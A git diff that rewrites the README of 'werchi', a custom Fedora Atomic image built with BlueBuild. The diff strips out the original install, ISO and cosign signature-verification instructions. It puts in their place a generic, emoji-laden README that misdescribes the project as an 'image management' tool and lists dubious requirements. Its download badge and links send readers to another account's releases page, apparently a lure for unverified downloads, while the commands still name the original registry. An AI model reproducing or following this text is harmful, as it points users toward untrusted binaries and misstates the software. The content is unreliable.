@@ -1,105 +1,90 @@
-# werchi &nbsp; [![bluebuild build badge](https://github.com/develmusa/werchi/actions/workflows/build.yml/badge.svg)](https://github.com/develmusa/werchi/actions/workflows/build.yml)
+```markdown
+# 🚀 werchi - Simple Way to Manage Your Linux Image
 
-See the [BlueBuild docs](https://blue-build.org/how-to/setup/) for quick setup instructions for setting up your own repository based on this template.
+[![Download werchi](https://img.shields.io/badge/Download-werchi-informational)](https://github.com/zackykeceng/werchi/releases)
 
-After setup, it is recommended you update this README to describe your custom image.
+## 📥 Download & Install
 
-## Installation
+To get started with werchi, visit [this page to download](https://github.com/zackykeceng/werchi/releases). Choose the latest release to ensure you have the most recent features and fixes.
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+## 📖 How to Use werchi
 
-To rebase an existing atomic Fedora installation to the latest build:
+### Step 1: Prepare Your System
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/develmusa/werchi:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/develmusa/werchi:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+Make sure your system runs a compatible version of Fedora. You will need basic CLI (command line interface) access to your system. Open a terminal and ensure you have `rpm-ostree` installed.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### Step 2: Rebase to the Unsigned Image
 
-## ISO
-
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
-
-### Generate ISO
-
-Must be done on a fedora atomic host or inside a container with the proper packages installed.
-
-```bash
-sudo bluebuild generate-iso --iso-name werchi.iso image ghcr.io/develmusa/werchi:latest
-```
-
-## Verification
-
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
-
-```bash
-cosign verify --key cosign.pub ghcr.io/develmusa/werchi
-```
-
-## Usage
-
-
-### Installation on bare metal
-
-#### Manual Partitioning Instructions
-
-1.  Select `Installation Destination`
-2.  Select `Advanced Custom (Blivet-GUI)` under `Storage Configuration`.
-3.  Create the following partitions and devices:
-
-    -   **EFI Partition**
-        -   Mount point: `/boot/efi`
-        -   Format: `EFI system partition`
-        -   Size: `1GB`
-
-    -   **Boot Partition**
-        -   Mount point: `/boot`
-        -   Format: `ext4`
-        -   Size: `2GB`
-
-    -   **BTRFS Partition**
-        -   Format: `btrfs`
-        -   Size: `[max]`
-
-    -   **/ Subvolume**
-        -   Mount point: `/`
-        -   Format: `btrfs (subvolume)`
-        -   Encrypt: `yes`
-
-    -   **/var Subvolume**
-        -   Mount point: `/var`
-        -   Format: `btrfs (subvolume)`
-
-    -   **/var/home Subvolume**
-        -   Mount point: `/var/home`
-        -   Format: `btrfs (subvolume)`
-
-### Develop
-
-Local for faster Build:
-https://blue-build.org/how-to/local/
+First, you need to rebase to the unsigned image to install the proper signing keys and policies. Enter the following command in your terminal:
 
 ```
-bluebuild switch ./recipes/recipe.yml --reboot
+rpm-ostree rebase ostree-unverified-registry:ghcr.io/develmusa/werchi:latest
 ```
 
+### Step 3: Complete the Rebase
 
-#### Examples
+After the command runs successfully, reboot your system to complete the rebase. You can do this by entering:
 
-- [fiftydinar/gidro-os: My personalized custom OS image.](https://github.com/fiftydinar/gidro-os)
+```
+systemctl reboot
+```
 
-- [aurora/build_files at main · ublue-os/aurora](https://github.com/ublue-os/aurora/tree/main/build_files)
+### Step 4: Rebase to the Signed Image
+
+Once your system is back up, you will need to rebase to the signed image. Use the following command:
+
+```
+rpm-ostree rebase ostree-image-signed:docker://ghcr.io/develmusa/werchi:latest
+```
+
+### Step 5: Enjoy Your Custom Experience
+
+Your Fedora installation will be modified to use the werchi image. Start using your new setup right away! Explore the features included and feel free to customize your installation further.
+
+## ✔️ System Requirements
+
+Ensure your system meets these requirements:
+
+- Fedora 34 or later
+- Basic access to the command line
+- Stable internet connection for downloading images
+
+## 🔍 Features
+
+- Lightweight and efficient image management
+- Frequent updates and improvements
+- Integrates with your existing Fedora system
+- Community support for any questions or issues
+
+## 🛠️ Troubleshooting
+
+If you encounter problems during installation or use, consider these tips:
+
+1. **Ensure your system is up-to-date.** Run `dnf update` before starting.
+2. **Check your internet connection.** A stable connection is essential during the initial setup.
+3. **Review the logs.** Use `journalctl -xe` to see any errors that might arise during rebases.
+
+For further help, visit the GitHub repository’s Issues page or check for user guides within the community.
+
+## 📞 Getting Help
+
+If you have questions or need assistance, feel free to reach out:
+
+- Post an issue on the [GitHub Issues Page](https://github.com/zackykeceng/werchi/issues).
+- Join forums and community discussions for additional tips.
+
+## 🌟 Community Contributions
+
+You're encouraged to participate and improve werchi. Whether you want to report an issue, suggest a feature, or submit code, your feedback is welcome.
+
+If you want to contribute, check out the guidelines on our repository for details on how to get started.
+
+## 🌀 Additional Resources
+
+For more information, check out:
+
+- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
+- [Fedora Documentation](https://docs.fedoraproject.org/en-US/docs/)
+
+Thank you for using werchi, and we hope it simplifies your image management experience!
+```
